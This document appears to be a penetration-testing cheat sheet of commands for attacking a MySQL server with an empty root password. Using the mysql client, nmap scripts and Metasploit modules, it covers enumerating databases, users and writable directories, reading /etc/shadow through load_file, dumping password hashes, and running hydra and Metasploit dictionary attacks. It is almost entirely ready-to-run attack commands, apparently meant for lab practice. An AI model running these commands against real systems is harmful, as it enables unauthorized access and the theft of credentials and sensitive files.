connect to mysql:
mysql -h <ip> -u root

get list of databases:
mysql> show databases;
nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 <ip>

get count of records in table:
mysql> use <db>;
mysql> select count(\*) from <table>;
nmap --script=mysql-query --script-args="query='select count(\*) from db.table;',username='root',password=''" -p 3306 <ip>

dump schema of all dbs
metasploit:
use auxiliary/scanner/mysql/mysql_schemadump
set RHOSTS <ip>
set USERNAME root
set PASSWORD ""

get writeable dirs
metasploit:
use auxiliary/scanner/mysql/mysql_writable_dirs
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set RHOSTS <ip>
set VERBOSE false
set PASSWORD ""

list of sensitive files
metasploit:
use auxiliary/scanner/mysql/mysql_file_enum
set RHOSTS <ip>
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
set PASSWORD ""

get system password hash
mysql -h <ip> -u root
mysql> select load_file("/etc/shadow");

get db users and their password hashes
nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 <ip>
metasploit:
use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS <ip>
set USERNAME root
set PASSWORD ""

check for anonymous logins
nmap --script=mysql-empty-password -p 3306 <ip>

check for interactive client
nmap --script=mysql-info -p 3306 <ip>

get list of users
nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 <ip>

get datadir
nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 <ip>

check if File Privileges can be granted
nmap --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 <ip>

Dictionary attacks

metasploit:
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <ip>
set USERNAME root
set PASS_FILE /user/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set STOP_ON_SUCCESS true

hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <ip> mysql ^1c7d26

